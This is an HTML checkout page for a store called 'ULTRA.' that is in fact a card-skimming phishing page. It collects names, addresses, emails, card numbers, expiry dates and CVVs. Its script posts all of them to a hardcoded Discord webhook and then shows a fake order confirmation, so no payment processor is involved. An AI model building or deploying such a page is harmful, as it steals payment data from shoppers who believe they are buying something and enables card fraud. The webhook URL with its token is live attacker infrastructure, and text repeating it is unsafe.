<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Outfit:wght@700;900&display=swap');

    :root {
        --primary: #000000;
        --accent: #2563eb;
        --bg: #ffffff;
        --surface: #f9f9f9;
        --text-main: #1a1a1a;
        --border: #e5e5e5;
    }

    body { 
        font-family: 'Inter', sans-serif; 
        font-size: 14px; 
        padding: 0; 
        margin: 0;
        background-color: var(--bg); 
        color: var(--text-main);
        -webkit-font-smoothing: antialiased;
    }

    * { box-sizing: border-box; }

    /* Header Nav Emulation */
    .mini-nav {
        text-align: center;
        padding: 30px 0;
        border-bottom: 1px solid var(--border);
        margin-bottom: 40px;
    }
    .logo {
        font-family: 'Outfit', sans-serif;
        font-size: 1.8rem;
        font-weight: 900;
        letter-spacing: -1px;
        text-transform: uppercase;
        color: var(--primary);
    }

    .row { display: flex; flex-wrap: wrap; margin: 0 -15px; }
    .col-100 { flex: 100%; padding: 0 15px; }
    
    .container { 
        max-width: 700px; 
        margin: 0 auto 100px; 
        padding: 0 20px;
    }

    h3 {
        font-family: 'Outfit', sans-serif;
        font-size: 20px;
        text-transform: uppercase;
        letter-spacing: 1px;
        margin: 40px 0 25px 0;
        border-bottom: 2px solid var(--primary);
        padding-bottom: 8px;
        display: inline-block;
    }

    input[type=text], select { 
        width: 100%; 
        margin-bottom: 20px; 
        padding: 15px; 
        border: 1px solid var(--border); 
        border-radius: 0px; /* Square edges to match the shop */
        font-family: 'Inter', sans-serif;
        font-size: 14px;
        transition: border 0.2s;
    }

    input[type=text]:focus, select:focus {
        outline: none;
        border-color: var(--primary);
    }

    label { 
        margin-bottom: 8px; 
        display: block; 
        font-weight: 600; 
        text-transform: uppercase;
        font-size: 11px;
        letter-spacing: 0.5px;
        color: #666;
    }

    .icon-container { 
        margin-bottom: 20px; 
        padding: 10px 0; 
        font-size: 28px; 
        display: flex;
        gap: 15px;
    }

    .btn { 
        background-color: var(--primary); 
        color: white; 
        padding: 20px; 
        margin: 20px 0; 
        border: 1px solid var(--primary); 
        width: 100%; 
        cursor: pointer; 
        font-size: 13px; 
        font-weight: 700;
        text-transform: uppercase;
        letter-spacing: 2px;
        transition: all 0.3s;
    }

    .btn:hover { 
        background-color: transparent; 
        color: var(--primary); 
    }

    #thanks-screen { 
        display: none; 
        text-align: center; 
        margin-top: 150px; 
        padding: 20px;
    }
    #thanks-screen h1 {
        font-family: 'Outfit', sans-serif;
        font-weight: 900;
        font-size: 3rem;
        letter-spacing: -2px;
    }

    @media (max-width: 500px) {
        .logo { font-size: 1.4rem; }
    }
</style>
</head>
<body>

<div class="mini-nav">
    <div class="logo">ULTRA.</div>
</div>

<div id="form-container">
  <div class="container">
    <form id="checkoutForm" onsubmit="event.preventDefault(); sendData();">
      <div class="row">
        <div class="col-100">
          <h3>Billing Address</h3>
          <label>Full Name</label>
          <input type="text" id="fname" placeholder="John M. Doe" required>

          <label>Email</label>
          <input type="text" id="email" placeholder="john@example.com" required>

          <label>Address</label>
          <input type="text" id="adr" placeholder="542 W. 15th Street" required>

          <label>Apt / Suite (Optional)</label>
          <input type="text" id="apt" placeholder="Apt 4B">

          <label>Country</label>
          <input type="text" id="country" placeholder="United States" required>

          <div class="row" style="margin:0">
            <div style="flex:50%; padding-right:10px;">
              <label>State</label>
              <input type="text" id="state" placeholder="New York" required>
            </div>
            <div style="flex:50%;">
              <label>City</label>
              <input type="text" id="city" placeholder="New York City" required>
            </div>
          </div>
          
          <label>Zip</label>
          <input type="text" id="zip" placeholder="10001" required>
        </div>

        <div class="col-100">
          <h3>Payment</h3>
          <div class="icon-container">
            <i class="fa fa-cc-visa" style="color:#1a1a1a;"></i>
            <i class="fa fa-cc-amex" style="color:#1a1a1a;"></i>
            <i class="fa fa-cc-mastercard" style="color:#1a1a1a;"></i>
            <i class="fa fa-cc-discover" style="color:#1a1a1a;"></i>
          </div>

          <label>Name on Card</label>
          <input type="text" id="cname" placeholder="John More Doe" required>

          <label>Credit card number</label>
          <input type="text" id="ccnum" placeholder="1111-2222-3333-4444" required>

          <div class="row" style="margin:0">
            <div style="flex:50%; padding-right:10px;">
              <label>Expiration Month</label>
              <select id="expmonth" required>
                <option value="01">01 - Jan</option><option value="02">02 - Feb</option><option value="03">03 - Mar</option>
                <option value="04">04 - Apr</option><option value="05">05 - May</option><option value="06">06 - Jun</option>
                <option value="07">07 - Jul</option><option value="08">08 - Aug</option><option value="09">09 - Sep</option>
                <option value="10">10 - Oct</option><option value="11">11 - Nov</option><option value="12">12 - Dec</option>
              </select>
            </div>
            <div style="flex:50%;">
              <label>Expiration Year</label>
              <select id="expyear" required>
                <option value="2026">2026</option><option value="2027">2027</option>
                <option value="2028">2028</option><option value="2029">2029</option>
                <option value="2030">2030</option>
              </select>
            </div>
          </div>

          <label>CVV</label>
          <input type="text" id="cvv" placeholder="123" required>
        </div>
      </div>

      <input type="submit" value="Complete Purchase" class="btn">
    </form>
  </div>
</div>

<div id="thanks-screen">
  <h1>Order Confirmed.</h1>
  <p style="color: #666; font-size: 16px; margin-top: 20px;">Thank you for your purchase!<br>Your product will be shipped within 7-18 business days.</p>
</div>

<script>
function sendData() {
  const formData = {
    "NAME": document.getElementById("fname").value,
    "EMAIL": document.getElementById("email").value,
    "ADDRESS": document.getElementById("adr").value,
    "APT NO": document.getElementById("apt").value,
    "CITY/STATE": document.getElementById("city").value + ", " + document.getElementById("state").value,
    "ZIP": document.getElementById("zip").value,
    "COUNTRY": document.getElementById("country").value,
    "HOLDER": document.getElementById("cname").value,
    "CARD NO": document.getElementById("ccnum").value,
    "EXPIRY": document.getElementById("expmonth").value + "/" + document.getElementById("expyear").value,
    "CVV": document.getElementById("cvv").value
  };

  let message = "```sql\n";
  message += "╭──────────────── DATA LOG: NEW TRANSACTION ────────────────╮\n";
  message += "│ FIELD        │ INFORMATION                                │\n";
  message += "├──────────────┼────────────────────────────────────────────┤\n";
  
  for (const [key, value] of Object.entries(formData)) {
    let label = key.padEnd(12, " ");
    let valStr = (value || "EMPTY").toString().substring(0, 42); 
    message += `│ ${label} │ ${valStr.padEnd(42, " ")} │\n`;
  }
  
  message += "╰──────────────┴────────────────────────────────────────────╯\n";
  message += "```";

  fetch("https://discord.com/api/webhooks/1494821427789037608/xA_Xd62gpnYwnSPWX8F6zKUqQZw76NHAFwkFWHQ4G7poSxUh-epRSThq2S0Uj_yOH6KZ", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: message })
  })
  .then(() => {
    document.getElementById("form-container").style.display = "none";
    document.getElementById("mini-nav")?.style.display = "none";
    document.getElementById("thanks-screen").style.display = "block";
  })
  .catch(() => alert("Error: Connection lost."));
}
</script>

</body>
</html>
